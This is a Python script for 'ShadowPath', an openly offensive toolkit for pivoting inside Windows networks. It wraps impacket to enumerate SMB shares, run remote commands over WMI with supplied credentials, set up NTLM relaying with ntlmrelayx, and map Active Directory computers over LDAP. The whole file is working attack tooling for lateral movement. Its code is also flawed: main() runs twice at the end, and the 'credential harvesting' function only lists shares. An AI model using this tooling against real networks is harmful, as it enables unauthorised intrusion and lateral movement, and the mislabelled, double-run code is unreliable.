#!/usr/bin/env python3
"""
ShadowPath: Smart Internal Network Pivoting Toolkit

This tool automates internal pivoting by combining:
  - Credential harvesting: Enumerate SMB shares on a target.
  - Remote execution: Execute commands on remote hosts via WMI/SMB.
  - NTLM/DNS Relay: Pivot through NTLM relaying (wraps ntlmrelayx.py).
  - Active Directory Mapping: Query AD via LDAP for computer objects.

Usage:
  shadowpath.py harvest <target> [-u USER] [-p PASS]
  shadowpath.py exec <target> -u USER -p PASS -c COMMAND
  shadowpath.py relay <target> [--listen-port PORT]
  shadowpath.py admap <server> -u USER -p PASS -b BASE_DN
"""

import argparse
import logging
import sys
import subprocess
from datetime import datetime

# Attempt to import impacket's SMBConnection
try:
    from impacket.smbconnection import SMBConnection
except ImportError:
    SMBConnection = None

from ldap3 import Server, Connection, ALL, NTLM

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)


def credential_harvest(args):
    """
    Harvest credentials by enumerating SMB shares on the target.
    Uses impacket's SMBConnection. If credentials are not provided, anonymous login is attempted.
    """
    target = args.target
    username = args.user if args.user else ''
    password = args.password if args.password else ''
    logging.info(f"Connecting to target {target} with username '{username or 'anonymous'}'")
    if SMBConnection is None:
        logging.error("impacket is not installed. Please install impacket to use this module.")
        sys.exit(1)
    try:
        smb = SMBConnection(target, target)
        smb.login(username, password)
        shares = smb.listShares()
        logging.info("Shares found on target:")
        for share in shares:
            share_name = share['shi1_netname'].decode('utf-8').strip()
            logging.info(f" - {share_name}")
        smb.logoff()
        logging.info("Credential harvesting completed.")
    except Exception as e:
        logging.error(f"Error during credential harvesting: {e}")


def remote_exec(args):
    """
    Execute a remote command on the target via WMI/SMB.
    This function wraps impacket's wmiexec.py tool; ensure it is installed and in your PATH.
    """
    target = args.target
    username = args.user
    password = args.password
    command = args.command
    logging.info(f"Executing remote command on target {target} as {username}")
    try:
        wmiexec_path = "wmiexec.py"  # Ensure wmiexec.py is in PATH from the impacket suite.
        cmd = [wmiexec_path, f"{username}:{password}@{target}", command]
        logging.info(f"Running: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        logging.info("Remote execution output:\n" + result.stdout)
        if result.stderr:
            logging.error("Remote execution error output:\n" + result.stderr)
    except subprocess.CalledProcessError as e:
        logging.error(f"Remote execution failed: {e}")
    except Exception as e:
        logging.error(f"Unexpected error during remote execution: {e}")


def ntlm_relay(args):
    """
    Set up an NTLM/DNS relay to pivot internal networks.
    This function wraps impacket's ntlmrelayx.py tool; ensure it is installed and in your PATH.
    """
    target = args.target
    listen_port = args.listen_port
    logging.info(f"Starting NTLM relay targeting {target} on local listen port {listen_port}")
    try:
        ntlmrelayx_path = "ntlmrelayx.py"  # Ensure ntlmrelayx.py is in PATH.
        cmd = [ntlmrelayx_path, "-t", target, "--listen-port", str(listen_port)]
        logging.info(f"Running: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        logging.info("NTLM relay output:\n" + result.stdout)
        if result.stderr:
            logging.error("NTLM relay error output:\n" + result.stderr)
    except subprocess.CalledProcessError as e:
        logging.error(f"NTLM relay failed: {e}")
    except Exception as e:
        logging.error(f"Unexpected error during NTLM relay: {e}")


def ad_map(args):
    """
    Map Active Directory by querying LDAP for computer objects.
    Uses the ldap3 library with NTLM authentication.
    """
    ldap_server = args.server
    user = args.user
    password = args.password
    base_dn = args.base
    logging.info(f"Connecting to LDAP server {ldap_server} with base DN {base_dn}")
    try:
        server = Server(ldap_server, get_info=ALL)
        conn = Connection(server, user=user, password=password, authentication=NTLM, auto_bind=True)
        conn.search(search_base=base_dn, search_filter='(objectClass=computer)', attributes=['cn', 'operatingSystem'])
        logging.info("Active Directory Computer Objects:")
        for entry in conn.entries:
            logging.info(entry)
        conn.unbind()
    except Exception as e:
        logging.error(f"Error during AD mapping: {e}")


def main():
    parser = argparse.ArgumentParser(
        description="ShadowPath: Smart Internal Network Pivoting Toolkit"
    )
    subparsers = parser.add_subparsers(dest="command", required=True)

    # Harvest subcommand
    harvest_parser = subparsers.add_parser("harvest", help="Harvest SMB shares and credentials")
    harvest_parser.add_argument("target", help="Target IP or hostname")
    harvest_parser.add_argument("-u", "--user", help="Username for SMB login (default: anonymous)")
    harvest_parser.add_argument("-p", "--password", help="Password for SMB login (default: empty)")
    harvest_parser.set_defaults(func=credential_harvest)

    # Exec subcommand
    exec_parser = subparsers.add_parser("exec", help="Execute remote command via WMI/SMB")
    exec_parser.add_argument("target", help="Target IP or hostname")
    exec_parser.add_argument("-u", "--user", required=True, help="Username for remote authentication")
    exec_parser.add_argument("-p", "--password", required=True, help="Password for remote authentication")
    exec_parser.add_argument("-c", "--command", required=True, help="Command to execute on the remote host")
    exec_parser.set_defaults(func=remote_exec)

    # Relay subcommand
    relay_parser = subparsers.add_parser("relay", help="Set up NTLM/DNS relay for pivoting")
    relay_parser.add_argument("target", help="Target URL/IP for NTLM relay (e.g., http://10.0.0.5)")
    relay_parser.add_argument("--listen-port", type=int, default=80, help="Local listen port (default: 80)")
    relay_parser.set_defaults(func=ntlm_relay)

    # AD mapping subcommand
    admap_parser = subparsers.add_parser("admap", help="Map Active Directory via LDAP")
    admap_parser.add_argument("server", help="LDAP server address (e.g., ldap://dc.example.com)")
    admap_parser.add_argument("-u", "--user", required=True, help="AD username (DOMAIN\\user)")
    admap_parser.add_argument("-p", "--password", required=True, help="AD password")
    admap_parser.add_argument("-b", "--base", required=True, help="Base DN for search (e.g., DC=example,DC=com)")
    admap_parser.set_defaults(func=ad_map)

    args = parser.parse_args()
    args.func(args)


if __name__ == '__main__':
    main()
    logging.info("Starting ShadowPath...")
    start_time = datetime.now()
    logging.info(f"Script started at {start_time.strftime('%Y-%m-%d %H:%M:%S')}")
    try:
        main()
    except KeyboardInterrupt:
        logging.info("Script interrupted by user.")
    except Exception as e:
        logging.error(f"An error occurred: {e}")
    finally:
        end_time = datetime.now()
        elapsed_time = end_time - start_time
        logging.info(f"Script finished at {end_time.strftime('%Y-%m-%d %H:%M:%S')}")
        logging.info(f"Total elapsed time: {elapsed_time}")
        logging.info("Exiting ShadowPath.")
        sys.exit(0)